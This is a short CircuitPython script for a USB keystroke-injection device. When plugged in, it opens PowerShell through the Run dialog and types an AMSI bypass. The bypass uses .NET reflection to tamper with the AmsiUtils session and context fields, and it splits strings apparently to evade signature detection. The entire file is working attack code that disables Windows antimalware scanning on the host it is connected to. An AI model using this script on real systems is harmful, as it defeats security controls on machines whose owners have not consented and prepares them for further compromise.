import usb_hid
import time

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kb = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kb)

strings = [ ("\"AmsiScanBuffer\""),
    ("$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) ;[Ref].Assembly.GetType(\"System.Management.Automation.AmsiU\"+\"tils\").GetField(\"amsiSession\",\"NonPublic,Static\").SetValue($null, $null) ;[Ref].Assembly.GetType(\"System.Management.Automation.AmsiU\"+\"tils\").GetField(\"amsiConte\"+\"xt\",\"NonPublic,Static\").SetValue($null, [IntPtr]$mem)"),
    ("\"AmsiScanBuffer\"")
]

def sendstr(string):
    layout.write(string)
    time.sleep(0.2)
    kb.send(Keycode.ENTER)
    time.sleep(0.5)

time.sleep(1.5)
kb.send(Keycode.WINDOWS, Keycode.R)
time.sleep(1)
layout.write("powershell.exe")
kb.send(Keycode.ENTER)
time.sleep(3)
for s in strings:
    sendstr(s)